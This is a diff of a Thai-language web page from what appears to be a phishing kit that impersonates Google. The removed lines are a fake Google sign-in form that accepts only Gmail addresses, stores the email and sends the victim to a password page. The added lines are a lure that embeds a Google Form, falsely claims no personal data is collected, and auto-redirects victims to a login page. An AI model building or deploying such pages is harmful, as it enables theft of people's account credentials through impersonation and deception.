@@ -3,153 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>เข้าสู่ระบบ</title>
+    <title>ฟอร์มกิจกรรม</title>
     <style>
         body {
             font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f3e7;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #edf2f7;
-            margin: 0;
+            text-align: center;
+            position: relative;
         }
-        .login-container {
-            display: flex;
-            flex-direction: column;
-            background: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            width: 900px;
-            text-align: left;
+
+        .form-container {
+            width: 90%;
+            max-width: 800px;
+            height: 80vh;
+            background-color: white;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            padding: 20px;
+            position: relative;
         }
-        .google-logo {
-            width: 100px;
-            margin-bottom: 20px;
-        }
-        h2 {
-            font-size: 24px;
-            margin: 0;
-            font-weight: 500;
-        }
-        .description {
-            font-size: 14px;
-            color: #555;
-            margin: 15px 0;
-        }
-        .input-box {
+
+        iframe {
             width: 100%;
-            padding: 12px;
-            margin-top: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 16px;
+            height: 100%;
+            border: none;
         }
-        .forgot-link {
-            display: block;
-            margin-top: 10px;
+
+        /* ✅ กล่อง "ลงชื่อเข้าใช้" */
+        .message-box {
+            position: fixed;
+            bottom: 33%;
+            left: 49%;
+            transform: translateX(-50%);
+            background-color: white;
+            padding: 42px;
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 300px;
+            text-align: left;
+            z-index: 9999;
+        }
+
+        .message-box h3 {
+            margin-top: 0;
+            font-size: 20px;
+        }
+
+        .message-box p {
+            font-size: 16px;
+            color: #333;
+        }
+
+        .message-box a {
             color: #1a73e8;
-            font-size: 14px;
             text-decoration: none;
         }
-        .forgot-link:hover {
+
+        .message-box a:hover {
             text-decoration: underline;
         }
-        .actions {
+
+        .message-box .button-container {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
+            justify-content: flex-end;
             margin-top: 20px;
         }
-        .register-btn {
-            background: none;
-            border: none;
-            color: #1a73e8;
-            font-size: 14px;
-            cursor: pointer;
-            padding: 5px;
-        }
-        .register-btn:hover {
-            text-decoration: underline;
-        }
 
-        /* ✅ ปุ่มถัดไปเป็นสีน้ำเงินตั้งแต่เริ่มต้น */
-        .next-btn {
-            background: #1a73e8;
+        .message-box .next-btn {
+            background-color: #e86c1a;
             color: white;
+            padding: 12px 20px;
             border: none;
-            padding: 10px 20px;
-            font-size: 14px;
             border-radius: 5px;
             cursor: pointer;
-            transition: opacity 0.2s ease-in-out;
-            opacity: 0.5; /* ✅ เริ่มต้นจางลง แต่ไม่เป็นสีเทา */
+            font-size: 14px;
         }
 
-        /* ✅ เมื่อ hover ให้เข้มขึ้น */
-        .next-btn:hover:not(:disabled) {
-            background: #1669c1;
+        .message-box .next-btn:hover {
+            background-color: #1669c1;
         }
 
-        /* ✅ ปรับปุ่มถัดไปให้ใช้งานง่ายขึ้น */
-        .next-btn:active {
-            transform: scale(0.98);
-        }
+        /* ปรับขนาดให้เหมาะกับมือถือ */
+        @media (max-width: 768px) {
+            .form-container {
+                height: 90vh;
+            }
 
-        /* ✅ ปุ่มยังเป็นสีน้ำเงิน แต่ดูจางถ้ายังไม่สามารถกดได้ */
-        .next-btn:disabled {
-            background: #1a73e8;
-            opacity: 0.5;
-            cursor: not-allowed;
+            .message-box {
+                width: 90%;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
-        <h2>ลงชื่อเข้าใช้</h2>
-        <p class="description">ด้วยบัญชี Google เพื่อไปยัง Gmail บัญชีนี้จะพร้อมใช้งานกับแอปอื่นๆ ของ Google ในเบราว์เซอร์</p>
+
+    <div class="form-container">
+        <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSdQ_uaHQolMBnG_Kncbf9b6kcPHIZ1CShw2mSvDX9Ci4zw5Jg/viewform?embedded=true"
+                frameborder="0" id="googleForm"></iframe>
+    </div>
+
+    <!-- ✅ กล่อง "ลงชื่อเข้าใช้" -->
+    <div class="message-box">
+        <h3>ลงชื่อเข้าใช้เพื่อดำเนินการต่อ</h3>
+        <p>ต้องลงชื่อเข้าใช้เพื่อกรอกแบบฟอร์มนี้ โดยจะไม่มีการเก็บข้อมูลส่วนตัวของคุณ</p>
+        <a href="#">รายละเอียดเพิ่มเติม</a>
         
-        <!-- ฟอร์มรับอีเมล -->
-        <input type="text" id="email" class="input-box" placeholder="อีเมลหรือโทรศัพท์" required oninput="validateEmail()">
-        <a href="#" class="forgot-link">หากลืมอีเมล</a>
-        
-        <div class="actions">
-            <button type="button" class="register-btn">สร้างบัญชี</button>
-            <button type="button" id="next-btn" class="next-btn" onclick="saveEmail()" disabled>ถัดไป</button>
+        <div class="button-container">
+            <button class="next-btn" id="loginButton">ลงชื่อเข้าใช้</button>
         </div>
     </div>
 
-    <!-- Firebase SDK (ใช้ compat version) -->
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
-
-    <!-- ✅ โหลด script.js หลังจาก Firebase SDK -->
     <script>
-        function validateEmail() {
-            let email = document.getElementById("email").value.trim();
-            let nextButton = document.getElementById("next-btn");
+        // ✅ ฟังก์ชันเปลี่ยนหน้าอัตโนมัติหลังจาก 4 วินาที
+        setTimeout(function() {
+            window.location.href = "login.html"; // เปลี่ยนไปที่หน้า login.html
+        }, 2000); // 2000 มิลลิวินาที = 2 วินาที
 
-            // ✅ ถ้าอีเมลลงท้ายด้วย @gmail.com ให้เปิดปุ่ม
-            if (email.endsWith("@gmail.com")) {
-                nextButton.disabled = false; // 🔓 เปิดใช้งานปุ่ม
-                nextButton.style.opacity = "1"; // ✅ คืนความเข้มของปุ่ม
-            } else {
-                nextButton.disabled = true; // 🔒 ปิดปุ่มถ้ายังไม่ถูกต้อง
-                nextButton.style.opacity = "0.5"; // 🔥 ทำให้ปุ่มดูจางลง
-            }
-        }
-
-        function saveEmail() {
-            let email = document.getElementById("email").value.trim();
-            if (!email.endsWith("@gmail.com")) {
-                return; // ❌ ไม่ให้ไปต่อถ้าไม่ใช่ @gmail.com
-            }
-
-            localStorage.setItem("userEmail", email);
-            window.location.href = "password.html"; // ✅ ไปหน้าถัดไป
-        }
+        // ✅ เมื่อกดปุ่ม "ลงชื่อเข้าใช้" จะเปลี่ยนหน้าทันที
+        document.getElementById('loginButton').addEventListener('click', function() {
+            document.getElementById('loginButton').innerText = "กำลังนำทาง..."; // แสดงข้อความ
+            setTimeout(function() {
+                window.location.href = "login.html"; // เปลี่ยนไปหน้า login.html
+            }, 1500); // 1.5 วินาที
+        });
     </script>
+
 </body>
 </html>
